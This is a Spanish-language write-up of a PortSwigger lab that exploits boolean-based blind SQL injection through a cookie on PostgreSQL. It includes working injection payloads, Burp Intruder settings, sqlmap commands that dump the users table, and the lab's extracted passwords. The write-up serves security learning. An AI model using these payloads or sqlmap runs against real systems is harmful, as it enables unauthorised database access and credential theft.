# PortSwigger: Blind SQL Injection (Conditional Responses)

**Dificultad:** Apprentice
**Plataforma:** PortSwigger Web Security Academy
**Motor de base de datos:** PostgreSQL
**Herramientas usadas:** Burp Suite (Repeater, Intruder), sqlmap

## Resumen

Explotación de una inyección SQL ciega (**blind, boolean-based**) a través de la cookie `TrackingId`. A diferencia de una SQLi clásica, la aplicación no muestra errores ni refleja datos directamente: la única señal disponible es la aparición o desaparición del mensaje `"Welcome back"` según si la condición inyectada es verdadera o falsa. Se extrajo la contraseña del usuario `administrator` primero de forma manual (para entender la lógica) y luego se automatizó la extracción completa con `sqlmap`.

## 1. Identificación del punto de inyección

El punto de inyección fue la cookie `TrackingId`, enviada en cada petición a `/filter?category=...`. La aplicación construye una consulta similar a:

```sql
SELECT * FROM tracking WHERE id = 'TU_TRACKING_ID'
```

## 2. Confirmando el oráculo booleano

Se probaron dos condiciones usando el valor real de la cookie como base:

```
TrackingId=<ID_REAL>' AND '1'='1
```
→ Condición verdadera, aparece **"Welcome back"**.

```
TrackingId=<ID_REAL>' AND '1'='2
```
→ Condición falsa, **no aparece** el mensaje.

Esta diferencia de comportamiento es el "oráculo" que permite inferir información de la base de datos sin verla directamente.

## 3. Confirmando la existencia de datos

Se confirmó la existencia de la tabla `users` y del usuario `administrator`:

```
TrackingId=<ID_REAL>' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```
→ Verdadero, aparece "Welcome back".

> **Nota sobre PostgreSQL:** las subconsultas que terminan en una comparación con comilla abierta (`='a`) deben mantener esa estructura, ya que la aplicación agrega automáticamente la comilla de cierre al final de la cookie. Condiciones que terminan en un número (ej. `LENGTH(password)>10`) requieren envolverse dentro del mismo patrón de subconsulta con comillas, o fallan silenciosamente con un 200 OK que no cumple la condición esperada.

## 4. Determinando la longitud de la contraseña

Mediante búsqueda binaria con `LENGTH()`:

```
TrackingId=<ID_REAL>' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a
```

Se acotó el rango probando distintos umbrales hasta confirmar que la contraseña tiene **exactamente 20 caracteres**.

## 5. Extracción manual con Burp Intruder

Para extraer cada carácter se usó `SUBSTRING`:

```
TrackingId=<ID_REAL>' AND (SELECT SUBSTRING(password,N,1) FROM users WHERE username='administrator')='§a§
```

Configuración en Intruder:
- **Attack type:** Sniper
- **Payload position:** el carácter a probar (marcado con `§`)
- **Payload type:** Simple list (a-z, 0-9)

Se identificó el carácter correcto comparando el **Content-Length** de cada respuesta: la mayoría de los intentos (condición falsa) devuelven un tamaño fijo, mientras que el carácter correcto (condición verdadera, con "Welcome back") devuelve un tamaño distinto.

Repitiendo el proceso cambiando la posición (`N` de 1 a 20), se confirmaron los dos primeros caracteres manualmente: `5`, `n`.

## 6. Automatización con sqlmap

Para completar la extracción se exportó la petición a un archivo (`request.txt`) con la cookie **original, sin payload**, y se usó sqlmap:

```bash
# Detectar la inyección y el motor de base de datos
sqlmap -r request.txt -p TrackingId --level=2 --batch

# Listar bases de datos (schemas en PostgreSQL)
sqlmap -r request.txt -p TrackingId --level=2 --batch --dbs

# Extraer la tabla users
sqlmap -r request.txt -p TrackingId --level=2 --batch -D public -T users --dump
```

**Resultado:**

| username | password |
|---|---|
| administrator | `5neabk793m8piim0x1tv` |
| wiener | `ilwx0ohcg3xplnaze1b0` |
| carlos | `jkmob7ktg008ih22l71p` |

## 7. Resolución del lab

Con las credenciales obtenidas se inició sesión como `administrator` en `/login`, resolviendo el laboratorio.

## Lecciones aprendidas

- En una inyección ciega no hace falta ver el error o el dato directamente: basta con una diferencia de comportamiento observable (contenido, tamaño de respuesta, tiempo) para extraer información completa de la base de datos.
- El comportamiento exacto de la inyección depende del motor de base de datos: lo que funciona en MySQL no siempre funciona igual en PostgreSQL, por lo que ajustar la sintaxis según el motor es clave.
- Hacer la extracción manual primero (con Burp Intruder) ayuda a entender la lógica antes de automatizar; herramientas como `sqlmap` son más rápidas pero se aprovechan mejor cuando ya se entiende qué está pasando por detrás.
